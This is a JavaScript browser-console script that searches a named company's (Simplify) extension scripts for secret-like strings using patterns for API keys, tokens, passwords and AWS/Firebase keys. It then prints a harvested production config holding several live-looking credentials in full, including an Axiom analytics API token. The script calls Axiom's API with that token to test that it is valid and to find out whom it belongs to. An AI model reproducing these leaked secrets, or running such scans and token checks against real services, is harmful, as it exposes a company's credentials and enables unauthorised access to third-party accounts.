// pattern matching to run in browser console to FIND SIMPLIFY's EXPOSED API KEYS :
const secretPatterns = [
  /api[_-]?key/gi,
  /secret/gi,
  /password/gi,
  /token/gi,
  /private[_-]?key/gi,
  /aws[_-]?access/gi,
  /firebase/gi,
];

// #################### WHAT I FOUND ####################
e.exports = {
  NODE_ENV: "production",
  TARGET_BROWSER: "chrome",
  API_ENDPOINT: "https://api.simplify.jobs",
  SIMPLIFY_DOMAIN: "https://simplify.jobs",
  SIMPLIFY_HOST: "simplify.jobs",
  SABRE_CONFIG_URL: "https://sabre.simplify.jobs",
  AXIOM_ORG_ID: "simplify-qiqd",
  AXIOM_ANALYTICS_API_TOKEN: "xaat-e0a585d9-2911-489d-8c83-babd0dc44f28",
  POSTHOG_ANALYTICS_ID: "foZTeM1AW8dh5WkaofxTYiInBhS4XzTzRqLs50kVziw",
  ANALYSIS_MODE: !1,
  SIMPLIFY_UNINSTALL_URL: "https://simplify.jobs/uninstall",
  FRIGADE_PUBLIC_API_KEY:
    "api_public_8GWmL7WA5ZhXlVJDwdggj3EJAvJSMhcCGwZVl4FPhT3I97vvn1d2En9Iax8yGuW8",
  VILLAGE_PUBLIC_KEY: "pk_UEOfEuB01uRgsKcs9wqcsB6FhTfmpNPU",
};

document.querySelectorAll("script").forEach(async (script) => {
  if (script.src) {
    try {
      const code = await fetch(script.src).then((r) => r.text());
      secretPatterns.forEach((pattern) => {
        const matches = code.match(pattern);
        if (matches) {
          console.log(`⚠️ Potential secret in ${script.src}:`, matches);
        }
      });
    } catch (e) {}
  }
});

// Replace with the values you found
const AXIOM_API_KEY = "xaat-e0a585d9-2911-489d-8c83-babd0dc44f28"; // Usually starts with 'xapt-'
const AXIOM_ORG_ID = "simplify-qiqd";

async function GG() {
  // Test 1: List datasets (basic API validation)
  const data1 = await fetch("https://api.axiom.co/v2/datasets", {
    headers: {
      Authorization: `Bearer ${AXIOM_API_KEY}`,
      "X-Axiom-Org-Id": AXIOM_ORG_ID,
    },
  })
    .then((r) => {
      console.log("Status:", r.status);
      if (r.ok) {
        console.log("✅ API KEY IS VALID!");
        return r.json();
      } else if (r.status === 401) {
        console.log("❌ Invalid or expired API key");
      } else if (r.status === 403) {
        console.log("⚠️ Key valid but lacks permission for this endpoint");
      }
      return r.text();
    })
    .then(console.log);

  // Get information about the token itself
  const data2 = await fetch("https://api.axiom.co/v2/user", {
    headers: {
      Authorization: `Bearer ${AXIOM_API_KEY}`,
      "X-Axiom-Org-Id": AXIOM_ORG_ID,
    },
  })
    .then(async (r) => await r.json())
    .then((data) => {
      console.log("Token belongs to:", data);
    });

  // Get information about the token itself
  const data3 = await fetch("https://api.axiom.co/v2/user", {
    headers: {
      Authorization: `Bearer ${AXIOM_API_KEY}`,
      "X-Axiom-Org-Id": AXIOM_ORG_ID,
    },
  })
    .then((r) => r.json())
    .then((data) => {
      console.log("Token belongs to:", data);
    });

  return { data1, data2, data3 };
}

const value = GG();
console.log("VALUE IS", value);
